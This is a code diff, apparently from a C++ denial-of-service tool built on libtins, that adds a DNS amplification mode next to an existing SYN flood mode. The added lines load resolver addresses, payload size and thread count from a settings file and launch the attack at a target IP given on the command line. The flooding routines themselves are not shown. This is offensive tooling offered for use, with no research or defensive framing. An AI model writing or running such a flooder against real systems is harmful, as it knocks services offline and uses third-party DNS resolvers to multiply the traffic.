@@ -1,13 +1,10 @@
-#include <tins/tins.h>
 #include <iostream>
-#include <sstream>
 #include <nlohmann/json.hpp>
 #include <fstream>
 #include "SynFlood.h"
+#include "DnsAmplification.h"
 
 using namespace Tins;
-
-enum smode_t { dns_amplification_attack, syn_flood_attack};
 
 int main(int argc, char* argv[]) {
     try {
@@ -22,10 +19,18 @@ int main(int argc, char* argv[]) {
         std::ifstream json_file("settings.json");
         nlohmann::json json_data = nlohmann::json::parse(json_file);
         std::cout << "Settings: " << json_data.dump(4) << std::endl;
-
         std::string target_ip(argv[2]);
         if(strcmp(argv[1], "-d")==0){
             std::cout << "DNS Amplification attack to " << target_ip << std::endl;
+            std::vector<IPv4Address> dns_servers;
+            for(const std::string& dns_server: json_data["dns_servers_list"])
+                dns_servers.emplace_back(dns_server);
+            DnsAmplification dnsAmplification(
+                    target_ip,
+                    dns_servers,
+                    json_data["upload_size"],
+                    json_data["threads_number"]);
+            dnsAmplification.run();
         } else {
             uint16_t target_port = argc<3 ? 80: std::stoi(argv[3]);
             std::cout << "SynFlood attack to " << target_ip << " on port " << target_port << std::endl;
